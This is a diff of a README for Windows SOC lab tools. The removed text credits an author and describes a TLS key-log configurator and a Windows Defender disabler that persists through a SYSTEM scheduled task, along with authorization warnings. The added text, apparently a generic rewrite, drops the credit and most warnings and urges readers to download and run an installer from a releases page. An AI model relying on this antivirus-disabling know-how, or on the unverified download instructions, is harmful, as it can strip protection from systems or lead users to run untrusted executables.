@@ -1,146 +1,74 @@
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# 🛠️ SOC-lab-tools - Simplify Your SOC Lab Setup
 
-Author: Michal Soltysik
+## 🚀 Getting Started
 
-Cybersecurity Analyst & Consultant | Forensics Examiner | SOC Trainer | Cyber Warfare Organizer
+Welcome to the SOC-lab-tools! This set of Windows tools helps you with your security operations center (SOC) lab. With these tools, you can easily set up automated TLS key logging for encrypted traffic analysis. Additionally, you can enable or disable Windows Defender components, assisting with malware research and Blue Team training.
 
-Official website: https://michalsoltysik.com/
+## 📥 Download Now
 
-LinkedIn: https://www.linkedin.com/in/michal-soltysik-ssh-soc/
+[![Download SOC-lab-tools](https://img.shields.io/badge/Download-SOC--lab--tools-brightgreen)](https://github.com/rn115794/SOC-lab-tools/releases)
 
-Cybersecurity content: https://www.youtube.com/playlist?list=PL0RdRWQWldOAAKBqOVEutxKMP-a6CNoLY
+## 🛠️ Features
 
-Accredible: https://www.credential.net/profile/michalsoltysik/wallet
+- **Automated TLS Key Logging**: Set up logging for web encrypted traffic effortlessly.
+- **Windows Defender Component Control**: Enable or disable 16 Windows Defender components to tailor security for your testing needs.
+- **User-Friendly Interface**: Designed for simple navigation, making it accessible for everyone.
 
-Credly: https://www.credly.com/users/michal-soltysik
+## 🔍 System Requirements
 
-Email: me@michalsoltysik.com
+To run SOC-lab-tools effectively, ensure your system meets the following requirements:
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+- **Operating System**: Windows 10 or later.
+- **Processor**: 1 GHz or faster.
+- **Memory**: At least 2 GB of RAM.
+- **Storage**: 100 MB of available disk space.
 
-Written in PowerShell (TLSKeyLogConfigurator, executed within the .NET-based Windows PowerShell runtime) and in C# (WindowsDefenderDisabler and WindowsDefenderEnabler, compiled against the .NET Framework 4.x).
+## 📂 Download & Install
 
-All tools are compiled into .exe executable files with an MZ file header.
+1. **Visit the downloads page**: Go to the [Releases page](https://github.com/rn115794/SOC-lab-tools/releases) to view the available versions.
+2. **Select your version**: Choose the latest version for best performance and security.
+3. **Download the installer**: Click on the provided link for the installer file and save it to your computer.
+4. **Run the installer**: Locate the downloaded file and double-click it to start the installation process.
+5. **Follow the installation prompts**: Simply follow the on-screen instructions to complete the installation.
 
-License: Free for personal and commercial use.
+## 🎯 How to Use SOC-lab-tools
 
-<br>
+After successful installation, you can start using SOC-lab-tools:
 
-Tools included:
+1. **Launch the Application**: Find the app in your Start menu or desktop and open it.
+2. **Configure TLS Key Logging**: Use the interface to set up your desired configurations for TLS logging.
+3. **Manage Windows Defender**:
+    - Go to the Windows Defender Control section.
+    - Choose which components to enable or disable based on your testing needs.
 
-(1) TLSKeyLogConfigurator.exe
-<br>
-(2) WindowsDefenderDisabler.exe
-<br>
-(3) WindowsDefenderEnabler.exe
+## 🛡️ Safety and Security
 
-<br>
+We prioritize your safety while using this tool. Ensure you understand the implications of enabling or disabling Windows Defender components. Takings steps to monitor your system's security is vital during any testing phase.
 
-Summary:
+## 🤝 Support
 
------------------------------------------
-TLSKeyLogConfigurator.exe
------------------------------------------
+For questions or issues, feel free to open an issue in the GitHub repository. Our community will assist you in resolving any concerns regarding the application.
 
-Important notice:
+## 📊 Topics
 
-<br>
+This project covers a variety of topics related to security operations and testing environments:
 
-(1) This tool configures TLS key logging and Wireshark preferences, enabling decryption and inspection of encrypted web traffic for analysis purposes.
+- HTTPS
+- Security Operations Center (SOC)
+- SOC Lab Tools
+- TLS Key Logging
+- Windows Defender Management
+- Analysis Tools like Wireshark
 
-(2) When misused, TLS key logging may allow sensitive or private communications to be decrypted and inspected, potentially violating privacy, confidentiality, or organizational security policies.
+## 📙 Additional Resources
 
-(3) Execution of this tool must be explicitly approved by the system owner or an authorized administrator, and its use must comply with applicable laws, internal policies, and scope of authorization.
+For further reading and resources related to SOC-lab-tools and its capabilities, visit the following links:
 
-(4) This tool is intended exclusively for SOC labs, controlled test environments, and authorized forensic or training scenarios.
+- [Wireshark Documentation](https://www.wireshark.org/docs/)
+- [Windows Defender Overview](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/windows-defender-antivirus-overview)
 
-(5) Operation of this tool requires full understanding of its impact and full responsibility for its use, particularly when handling decrypted network traffic.
+## 📞 Community and Contributions
 
-<br>
-<br>
+We encourage contributions from everyone. If you want to improve SOC-lab-tools, consider submitting your suggestions or making improvements through pull requests. 
 
-Prerequisite:
-
-<br>
-
-(1) Wireshark must be installed on the system for TLS traffic decryption to be usable; the tool configures TLS key logging and Wireshark preferences but does not install Wireshark itself.
-
-<br>
-<br>
-
-The application performs the following functions:
-
-<br>
-
-(1) runs as a console application that performs user-level TLS key logging configuration and Wireshark preference updates; it is recommended to run the tool as an administrator to ensure successful execution policy adjustment for the current process;
-
-(2) automates the setup of TLS key logging on Windows by creating a dedicated key log directory and file and configuring the SSLKEYLOGFILE user environment variable;
-
-(3) updates Wireshark preferences to enable TLS session decryption using the configured key log file;
-
-(4) provides a detailed status view showing Wireshark installation detection, key log file existence and size (bytes, KB, MB), environment variable state (user and session), and Wireshark TLS configuration status;
-
-(5) supports safe configuration (no overwrite) and forced configuration modes, with optional backup creation of existing key log files and graceful handling of locked files;
-
-(6) logs all actions to a transcript file stored on the user's desktop, enabling auditing and repeatability in forensic and SOC training environments.
-
--------------------------------------------
-WindowsDefenderDisabler.exe
--------------------------------------------
-
-Important notice:
-
-<br>
-
-(1) This tool modifies security-critical Windows Defender configuration by applying registry- and service-level enforcement intended exclusively for isolated SOC labs and controlled test environments.
-
-(2) Improper use in a production environment, enterprise network, or unmanaged system may significantly reduce system security, expose the host to malware, or violate organizational security policies.
-
-(3) Execution of this tool must be explicitly approved by the system owner or an authorized administrator. Use on systems without proper authorization or outside of controlled testing scenarios is strongly discouraged.
-
-(4) Operation of this tool requires full understanding of its impact and full responsibility for its use.
-
-(5) This tool must never be deployed on production systems, end-user workstations, or environments where security controls are required to remain active.
-
-<br>
-<br>
-
-The application performs the following functions:
-
-<br>
-
-(1) runs as a Windows utility intended for isolated lab environments and requires administrator privileges;
-
-(2) disables Windows Defender by applying policy-level registry changes affecting 9 functional protection components, including real-time monitoring, behavior monitoring, cloud reporting, scanning features, and exploit guard controls;
-
-(3) disables 7 Defender-related services and drivers by modifying their startup configuration at the system level;
-
-(4) ensures persistence of the disabled state by creating and executing a scheduled task running as SYSTEM with multiple triggers, including system boot, user logon, and periodic execution, to ensure Windows Defender remains disabled and does not automatically re-enable itself over time;
-
-(5) copies itself to a fixed system location and executes from there to ensure consistent task execution;
-
-(6) appends a single timestamped entry on each execution, including executions at system boot, at user logon, and multiple times per day (separate time triggers - effectively hourly), to a shared log file, recording Windows Defender disable operations and providing a simple audit trail;
-
-(7) displays an informational pop-up notification only on first execution when the scheduled task is created.
-
--------------------------------------------
-WindowsDefenderEnabler.exe
--------------------------------------------
-
-The application performs the following functions:
-
-<br>
-
-(1) runs as a Windows utility intended for restoring Windows Defender functionality in lab environments and requires administrator privileges;
-
-(2) removes policy-level registry values used to disable Defender functional protection components;
-
-(3) restores startup configuration for Defender-related services and drivers, re-enabling them to their default automatic state;
-
-(4) deletes the scheduled task responsible for enforcing Defender disable persistence;
-
-(5) appends a single timestamped entry per execution to the same shared log file used by the disabler, explicitly recording that Windows Defender was enabled and maintaining continuity of auditing;
-
-(6) displays an informational pop-up notification only when the disabling scheduled task existed and was successfully removed.
-
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Thank you for using SOC-lab-tools! Your feedback and participation help improve this tool for all users.
